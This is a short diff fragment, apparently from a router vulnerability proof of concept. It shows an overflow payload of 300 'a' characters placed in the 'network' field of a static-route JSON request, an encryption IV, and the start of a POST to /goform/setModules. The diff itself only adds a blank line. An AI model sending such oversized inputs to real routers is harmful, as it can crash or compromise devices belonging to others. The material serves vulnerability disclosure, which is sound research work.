@@ -26,6 +26,7 @@ IV：EU5H62G9ICGRNI43
 Unencrypted data：
 
 payload = 'a'*300
+
 {"staticroute":[{"operateType":"add","network":"payload","mask":"255.255.255.0","gateway":"192.168.1.1","ifname":"WAN1"}]}
 ```
 POST /;stok=cb32b71ef54db0e31f211ec82fe184a5/goform/setModules?modules=staticRouteList HTTP/1.1
